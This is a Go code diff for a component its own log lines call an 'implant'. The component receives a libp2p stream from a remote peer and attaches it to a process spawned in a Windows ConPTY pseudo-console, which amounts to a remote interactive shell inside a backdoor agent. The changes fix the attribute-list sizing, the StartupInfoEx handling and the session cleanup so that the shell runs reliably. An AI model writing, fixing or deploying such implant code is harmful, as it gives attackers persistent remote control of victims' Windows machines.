@@ -6,6 +6,7 @@ import (
 	"encoding/binary"
 	"io"
 	"log"
+	"time"
 	"unsafe"
 
 	"github.com/libp2p/go-libp2p/core/network"
@@ -101,9 +102,9 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	}
 	log.Printf("[implant] ConPTY created, hPC=0x%x", uintptr(hPC))
 
-	var attrList [1024]byte
 	var sz uintptr
 	procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&sz)))
+	attrList := make([]byte, sz)
 	ret, _, _ = procInitializeProcThreadAttributeList.Call(
 		uintptr(unsafe.Pointer(&attrList[0])),
 		1, 0,
@@ -142,8 +143,7 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	}
 
 	si := windows.StartupInfoEx{}
-	si.StartupInfo.Cb = uint32(unsafe.Sizeof(windows.StartupInfo{}) + unsafe.Sizeof(&attrList[0]))
-	si.StartupInfo.Flags = windows.STARTF_USESTDHANDLES
+	si.StartupInfo.Cb = uint32(unsafe.Sizeof(windows.StartupInfoEx{}))
 	si.ProcThreadAttributeList = (*windows.ProcThreadAttributeList)(unsafe.Pointer(&attrList[0]))
 
 	pi := new(windows.ProcessInformation)
@@ -153,7 +153,7 @@ func (a *Agent) handleShellStream(s network.Stream) {
 		false,
 		windows.EXTENDED_STARTUPINFO_PRESENT|windows.CREATE_UNICODE_ENVIRONMENT,
 		nil, nil,
-		&si.StartupInfo,
+		(*windows.StartupInfo)(unsafe.Pointer(&si)),
 		pi,
 	)
 	if err != nil {
@@ -175,7 +175,11 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	go func() {
 		io.Copy(inPipe, s)
 		inPipe.Close()
-		procClosePseudoConsole.Call(uintptr(hPC))
+		time.AfterFunc(2*time.Second, func() {
+			if pi.Process != 0 {
+				windows.TerminateProcess(pi.Process, 1)
+			}
+		})
 		done <- struct{}{}
 	}()
 
@@ -186,12 +190,14 @@ func (a *Agent) handleShellStream(s network.Stream) {
 	}()
 
 	<-done
-	procClosePseudoConsole.Call(uintptr(hPC))
-	s.Close()
-
 	<-done
 
-	windows.WaitForSingleObject(pi.Process, 5000)
+	procClosePseudoConsole.Call(uintptr(hPC))
+	s.Close()
+	windows.CloseHandle(hPtyIn)
+	windows.CloseHandle(hPtyOut)
+
+	windows.WaitForSingleObject(pi.Process, windows.INFINITE)
 	windows.CloseHandle(pi.Process)
 
 	log.Printf("[implant] shell ended for %s", remotePeer.String())
